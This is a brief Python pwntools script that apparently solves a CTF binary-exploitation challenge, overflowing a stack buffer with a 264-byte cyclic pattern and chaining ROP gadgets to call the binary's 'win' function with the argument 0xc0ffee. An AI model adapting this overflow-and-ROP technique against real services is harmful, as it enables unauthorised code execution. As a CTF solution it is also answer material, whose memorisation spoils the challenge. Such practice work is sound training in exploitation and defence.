#!/usr/bin/env python3

from pwn import *
elf  = context.binary = ELF('./main')
libc = elf.libc

io = process()

rop = ROP(elf)
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
RET = rop.find_gadget(['ret'])[0]

io.recvuntil(b"Are you enjoying the CyberAlphas CTF? ")

payload = flat(
    cyclic(256+8),
    POP_RDI,
    p64(0xc0ffee),
    p64(RET),
    p64(elf.sym.win)
)

io.sendline(payload)
io.interactive()
